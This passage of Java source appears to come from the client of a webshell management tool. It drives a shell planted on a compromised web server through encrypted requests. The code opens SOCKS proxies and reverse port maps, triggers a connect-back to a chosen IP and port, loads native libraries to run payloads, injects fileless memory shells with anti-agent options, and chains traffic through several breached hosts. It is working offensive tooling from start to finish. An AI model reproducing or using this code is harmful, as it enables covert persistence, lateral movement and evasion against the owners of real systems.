    }

    @Override
    public JSONObject closeLocalPortMap(String targetIP, String targetPort) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "closeLocal");
        params.put("targetIP", targetIP);
        params.put("targetPort", targetPort);
        byte[] data = Utils.getData(this.cryptor, "PortMap", params, this.currentType);
        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.compareMode, this.beginIndex, this.endIndex, this.prefixBytes, this.suffixBytes);
        byte[] resData = (byte[])resultObj.get("data");
        String resultTxt = new String(this.cryptor.decrypt(resData));
        JSONObject result = new JSONObject(resultTxt);
        return result;
    }

    @Override
    public boolean closeLocalPortMapWorker(String socketHash) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "closeLocalWorker");
        params.put("socketHash", socketHash);
        byte[] data = Utils.getData(this.cryptor, "PortMap", params, this.currentType);
        Map resHeader = (Map)Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.compareMode, this.beginIndex, this.endIndex, this.prefixBytes, this.suffixBytes).get("header");
        return ((String)resHeader.get("status")).equals("200");
    }

    @Override
    public boolean closeRemotePortMap() throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "closeRemote");
        JSONObject result = this.parseCommonAction("PortMap", params);
        return result.getString("status").equals("success");
    }

    @Override
    public JSONObject readProxyData(String socketHash) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "read");
        params.put("socketHash", socketHash);
        JSONObject result = this.parseCommonAction("SocksProxy", params);
        return result;
    }

    @Override
    public JSONObject writeProxyData(byte[] proxyData, String socketHash) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "write");
        params.put("socketHash", socketHash);
        params.put("extraData", Base64.getEncoder().encodeToString(proxyData));
        JSONObject result = this.parseCommonAction("SocksProxy", params);
        return result;
    }

    @Override
    public JSONObject clearProxy() throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "clear");
        JSONObject result = this.parseCommonAction("SocksProxy", params);
        return result;
    }

    @Override
    public JSONObject closeProxy(String socketHash) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "close");
        params.put("socketHash", socketHash);
        JSONObject result = this.parseCommonAction("SocksProxy", params);
        return result;
    }

    @Override
    public JSONObject openProxy(String targetIp, String targetPort, String socketHash) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "create");
        params.put("targetIP", targetIp);
        params.put("targetPort", targetPort);
        params.put("socketHash", socketHash);
        JSONObject result = this.parseCommonAction("SocksProxy", params);
        return result;
    }

    @Override
    public JSONObject openProxyAsyc(String targetIp, String targetPort, String socketHash) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "create");
        params.put("targetIP", targetIp);
        params.put("targetPort", targetPort);
        params.put("socketHash", socketHash);
        Runnable backgroundRunner = () -> {
            try {
                JSONObject jSONObject = this.parseCommonAction("SocksProxy", params);
            } catch (Exception exception) {
                // empty catch block
            }
        };
        new Thread(backgroundRunner).start();
        JSONObject result = new JSONObject();
        result.put("status", "success");
        result.put("msg", "ok");
        return result;
    }

    private void initBodySignature(byte[] resData, int beginIndex, int endIndex) {
        if (beginIndex == -1 || endIndex == -1) {
            return;
        }
        int head = beginIndex - 20;
        head = head > 0 ? head : 0;
        this.prefixBytes = Arrays.copyOfRange(resData, head, beginIndex);
        int tail = resData.length - endIndex;
        tail = tail > 20 ? 20 : tail;
        this.suffixBytes = Arrays.copyOfRange(resData, resData.length - endIndex, resData.length - endIndex + tail);
        if (Utils.indexOf(resData, this.prefixBytes) != head || Utils.indexOf(resData, this.suffixBytes) != resData.length - endIndex) {
            this.prefixBytes = null;
            this.suffixBytes = null;
        }
    }

    @Override
    public JSONObject echo(String content) throws Exception {
        JSONObject result;
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("content", content);
        byte[] data = Utils.getData(this.cryptor, "Echo", params, this.effectType);
        Map<String, Object> resultObj = this.doRequestAndParse(data);
        Map responseHeader = (Map)resultObj.get("header");
        JSONObject expectedSuccessObj = new JSONObject();
        //php
//        byte[] dataa = (byte[]) resultObj.get("data");
//        System.out.println(new String(dataa, StandardCharsets.UTF_8));

        expectedSuccessObj.put("status", Base64.getEncoder().encodeToString("success".getBytes()));
        expectedSuccessObj.put("msg", Base64.getEncoder().encodeToString(content.getBytes()));
        String expectedSuccessBody = expectedSuccessObj.toString();
        expectedSuccessBody = String.format("{\"status\":\"%s\",\"msg\":\"%s\"}", Base64.getEncoder().encodeToString("success".getBytes()), Base64.getEncoder().encodeToString(content.getBytes()));
        byte[] expectedSuccessBodyBytes = this.cryptor.encrypt(expectedSuccessBody.getBytes());
        byte[] resData = (byte[])resultObj.get("data");
        this.beginIndex = Utils.indexOf(resData, expectedSuccessBodyBytes);
        this.endIndex = resData.length - (this.beginIndex + expectedSuccessBodyBytes.length);
        int n = this.endIndex = this.beginIndex == -1 ? -1 : this.endIndex;
        if (this.beginIndex > 0 || this.endIndex > 0) {
            this.compareMode = Constants.COMPARE_MODE_NUM;
            this.initBodySignature(resData, this.beginIndex, this.endIndex);
            resData = Arrays.copyOfRange(resData, this.beginIndex, resData.length - this.endIndex);
        }
        String resultTxt = "";
        try {
            resultTxt = this.effectType.equals("native") ? new String(this.cryptor.decryptCompatible(resData)) : new String(this.cryptor.decrypt(resData));
        } catch (InvocationTargetException e) {
            if (e.getTargetException() instanceof IllegalBlockSizeException) {
                throw new DecryptException((String)responseHeader.get("status"), new String(resData));
            }
        } catch (Exception e) {
            e.printStackTrace();
        } catch (Throwable t2) {
            t2.printStackTrace();
        }
        try {
            result = new JSONObject(resultTxt);
        } catch (Exception e) {
            throw new DecryptException((String)responseHeader.get("status"), new String(resData));
        }
        for (String key : result.keySet()) {
            result.put(key, new String(Base64.getDecoder().decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }

    @Override
    public JSONObject getBasicInfo(String whatever) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("whatever", whatever);
        JSONObject result = this.parseCommonAction("BasicInfo", params);
        this.offlineHelper.addRecord(this.effectShellEntity.getString("url"), null, result);
        return result;
    }

    private void showErrorMessage(String title, String msg) {
        Alert alert = new Alert(Alert.AlertType.ERROR);
        Window window = alert.getDialogPane().getScene().getWindow();
        window.setOnCloseRequest(event -> window.hide());
        alert.setTitle(title);
        alert.setHeaderText("");
        alert.setContentText(msg);
        alert.show();
    }

    @Override
    public void keepAlive() throws Exception {
        try {
            while (true) {
                Thread.sleep((new Random().nextInt(5) + 5) * 60 * 1000);
                int randomStringLength = new SecureRandom().nextInt(3000);
                this.echo(Utils.getRandomString(randomStringLength));
            }
        } catch (Exception e) {
            if (e instanceof InterruptedException) {
                return;
            }
            Platform.runLater(() -> this.showErrorMessage("\u63d0\u793a", "\u7531\u4e8e\u60a8\u957f\u65f6\u95f4\u672a\u64cd\u4f5c\uff0c\u5f53\u524d\u8fde\u63a5\u4f1a\u8bdd\u5df2\u8d85\u65f6\uff0c\u8bf7\u91cd\u65b0\u6253\u5f00\u8be5\u7f51\u7ad9\u3002"));
            return;
        }
    }

    @Override
    public JSONObject connectBack(String type, String ip, String port) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("type", type);
        params.put("ip", ip);
        params.put("port", port);
        JSONObject result = this.parseCommonAction("ConnectBack", params);
        return result;
    }

    @Override
    public JSONObject loadNativeLibrary(String libraryPath) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "load");
        params.put("whatever", Utils.getWhatever());
        params.put("libraryPath", libraryPath);
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "LoadNativeLibrary", params, this.currentType);
        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.compareMode, this.beginIndex, this.endIndex, this.prefixBytes, this.suffixBytes);
        byte[] resData = (byte[])resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        JSONObject result = new JSONObject(resultTxt);
        for (String key : result.keySet()) {
            result.put(key, new String(Base64.getDecoder().decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }

    @Override
    public JSONObject executePayload(String uploadLibPath, String payload) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "execute");
        params.put("whatever", Utils.getWhatever());
        params.put("uploadLibPath", uploadLibPath);
        params.put("payload", payload);
        JSONObject result = this.parseCommonAction("LoadNativeLibrary", params);
        return result;
    }

    @Override
    public JSONObject loadLibraryAndexecutePayload(String fileContent, String payload) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "execute");
        params.put("whatever", Utils.getWhatever());
        params.put("fileContent", fileContent);
        params.put("payload", payload);
        JSONObject result = this.parseCommonAction("LoadNativeLibrary", params);
        return result;
    }

    @Override
    public JSONObject loadLibraryAndfreeFile(String fileContent, String filePath) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "freeFile");
        params.put("whatever", Utils.getWhatever());
        params.put("fileContent", fileContent);
        params.put("filePath", filePath);
        JSONObject result = this.parseCommonAction("LoadNativeLibrary", params);
        return result;
    }

    @Override
    public JSONObject freeFile(String uploadLibPath, String filePath) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "freeFile");
        params.put("whatever", Utils.getWhatever());
        params.put("uploadLibPath", uploadLibPath);
        params.put("filePath", filePath);
        JSONObject result = this.parseCommonAction("LoadNativeLibrary", params);
        return result;
    }

    @Override
    public JSONObject loadLibraryAndAntiAgent(String fileContent) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "antiAgent");
        params.put("whatever", Utils.getWhatever());
        params.put("fileContent", fileContent);
        JSONObject result = this.parseCommonAction("LoadNativeLibrary", params);
        return result;
    }

    @Override
    public JSONObject antiAgent(String uploadLibPath) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "antiAgent");
        params.put("whatever", Utils.getWhatever());
        params.put("uploadLibPath", uploadLibPath);
        JSONObject result = this.parseCommonAction("LoadNativeLibrary", params);
        return result;
    }

    @Override
    public JSONObject loadLibraryAndtest() throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "test");
        params.put("whatever", Utils.getWhatever());
        JSONObject result = this.parseCommonAction("LoadNativeLibrary", params);
        return result;
    }

    @Override
    public JSONObject getMemShellTargetClass() throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "get");
        JSONObject result = this.parseCommonAction("MemShell", params);
        return result;
    }

    @Override
    public JSONObject injectAgentNoFileMemShell(String className, String classBody, boolean isAntiAgent) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "injectAgentNoFile");
        params.put("className", className);
        params.put("classBody", classBody);
        params.put("antiAgent", isAntiAgent + "");
        JSONObject result = this.parseCommonAction("MemShell", params);
        return result;
    }

    @Override
    public JSONObject injectAgentMemShell(String libPath, String path, String password, boolean isAntiAgent) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "injectAgent");
        params.put("libPath", libPath);
        params.put("path", path);
        String sourceCode = String.format(Constants.JAVA_CODE_TEMPLATE_SHORT, this.cryptor.getTransProtocol("jsp").getDecode());
        byte[] payload = Utils.getClassFromSourceCode(sourceCode);
        params.put("password", Base64.getEncoder().encodeToString(payload));
        params.put("antiAgent", isAntiAgent + "");
        JSONObject result = this.parseCommonAction("MemShell", params);
        return result;
    }

    @Override
    public JSONObject createReversePortMap(String listenPort) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "create");
        params.put("listenPort", listenPort);
        JSONObject result = this.parseCommonAction("ReversePortMap", params);
        return result;
    }

    @Override
    public JSONObject readReversePortMapData(String socketHash) throws Exception {
        Object resData = null;
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "read");
        params.put("socketHash", socketHash);
        JSONObject result = this.parseCommonAction("ReversePortMap", params);
        return result;
    }

    @Override
    public boolean writeReversePortMapData(byte[] proxyData, String socketHash) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "write");
        params.put("socketHash", socketHash);
        params.put("extraData", Base64.getEncoder().encodeToString(proxyData));
        JSONObject result = this.parseCommonAction("ReversePortMap", params);
        return result.getString("status").equals("success");
    }

    @Override
    public JSONObject listReversePortMap() throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "list");
        JSONObject result = this.parseCommonAction("ReversePortMap", params);
        return result;
    }

    @Override
    public JSONObject stopReversePortMap(String listenPort) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "stop");
        params.put("listenPort", listenPort);
        JSONObject result = this.parseCommonAction("ReversePortMap", params);
        return result;
    }

    @Override
    public JSONObject closeReversePortMap(String socketHash) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "close");
        params.put("socketHash", socketHash);
        JSONObject result = this.parseCommonAction("ReversePortMap", params);
        return result;
    }

    @Override
    public byte[] warpTransferPayload(byte[] payloadBody, String scriptType, String target, String type, String direction, String effectHeaders) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("target", target);
        params.put("type", type);
        params.put("direction", direction);
        params.put("effectHeaders", effectHeaders);
        params.put("payloadBody", Base64.getEncoder().encodeToString(payloadBody));
        byte[] data = Utils.getData(this.cryptor, "Transfer", params, scriptType);
        return data;
    }

    @Override
    public Map<String, Object> transferPayload(byte[] payloadBody) throws Exception {
        byte[] data = payloadBody;
        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.compareMode, this.beginIndex, this.endIndex, this.prefixBytes, this.suffixBytes);
        return resultObj;
    }

    private Map<String, Object> doRequestAndParse(byte[] data) throws Exception {
        if (this.needTransfer) {
            for (int i = this.childList.size() - 1; i >= 0; --i) {
                String scriptType = this.shellChains.get(i).getString("type");
                Map<String, Object> childObj = this.childList.get(i);
                JSONObject childShellEntity = (JSONObject)childObj.get("childShellEntity");
                String childScriptType = childShellEntity.getString("type");
                Map<String, String> childHeaders = this.scriptHeaders.get(childScriptType);
                StringBuilder childHeadersStr = new StringBuilder();
                if (childHeaders != null) {
                    for (String headerName : childHeaders.keySet()) {
                        childHeadersStr.append(String.format("%s|%s\n", headerName, childHeaders.get(headerName)));
                    }
                }
                BShell bShell = (BShell)childObj.get("bShell");
                String target = childShellEntity.getString("url");
                int bShellType = bShell.getType();
                String transMode = "HTTP";
                String direction = "Forward";
                if (bShellType == Constants.BSHELL_TYPE_TCP) {
                    transMode = "TCP";
                } else if (bShellType == Constants.BSHELL_TYPE_HTTP) {
                    transMode = "HTTP";
                } else if (bShellType == Constants.BSHELL_TYPE_TCP_REVERSE) {
                    transMode = "TCP";
                    direction = "Reverse";
                }
                data = this.warpTransferPayload(data, scriptType, target, transMode, direction, childHeadersStr.toString());
            }
            return this.transferPayload(data);
        }
        return Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.compareMode, this.beginIndex, this.endIndex, this.prefixBytes, this.suffixBytes);
    }

    @Override
    public JSONObject doProxy(String type, String target, String payloadBody) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("type", type);
        params.put("target", target);
        params.put("payloadBody", payloadBody);
        JSONObject result = this.parseCommonAction("Proxy", params);
        return result;
    }

    private JSONObject parseCommonAction(String payloadName, Map<String, String> params) throws Exception {
        String resultTxt;
        if (this.effectType.equals("aspx")) {
            params.put("sessionId", this.sessionId);
        }
        byte[] data = Utils.getData(this.cryptor, payloadName, params, this.effectType);
        //jsp
        //System.out.println(data);

        Map<String, Object> resultObj = this.doRequestAndParse(data);
//        byte[] dataa = (byte[]) resultObj.get("data");
//        System.out.println(new String(dataa, StandardCharsets.UTF_8));
        byte[] resData = (byte[])resultObj.get("data");
        resData = ShellService.extractPayload(resData, this.compareMode, this.beginIndex, this.endIndex, this.prefixBytes, this.suffixBytes);
        if (this.effectType.equals("native")) {
            resultTxt = new String(this.cryptor.decryptCompatible(resData));
        } else {
            try {
                resultTxt = new String(this.cryptor.decrypt(resData));
            } catch (InvocationTargetException invocationTargetException) {
                this.compareMode = Constants.COMPARE_MODE_BYTES;
                resData = (byte[])resultObj.get("data");
                resData = ShellService.extractPayload(resData, this.compareMode, this.beginIndex, this.endIndex, this.prefixBytes, this.suffixBytes);
                resultTxt = new String(this.cryptor.decrypt(resData));
            }
        }
        JSONObject result = new JSONObject(resultTxt);
        for (String key : result.keySet()) {
            result.put(key, new String(Base64.getDecoder().decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }

    @Override
    public void setCompareMode(int compareMode) {
        this.compareMode = compareMode;
    }

    private static byte[] extractPayload(byte[] resData, int compareMode, int beginIndex, int endIndex, byte[] prefixBytes, byte[] suffixBytes) {
        if (compareMode == Constants.COMPARE_MODE_NUM) {
            if (resData.length - endIndex >= beginIndex) {
                resData = Arrays.copyOfRange(resData, beginIndex, resData.length - endIndex);
            }
        } else if (compareMode == Constants.COMPARE_MODE_BYTES) {
            beginIndex = Utils.indexOf(resData, prefixBytes) + prefixBytes.length;
            endIndex = resData.length - Utils.indexOf(resData, suffixBytes);
            if (resData.length - endIndex >= beginIndex) {
                resData = Arrays.copyOfRange(resData, beginIndex, resData.length - endIndex);
            }
        }
        return resData;
    }
}

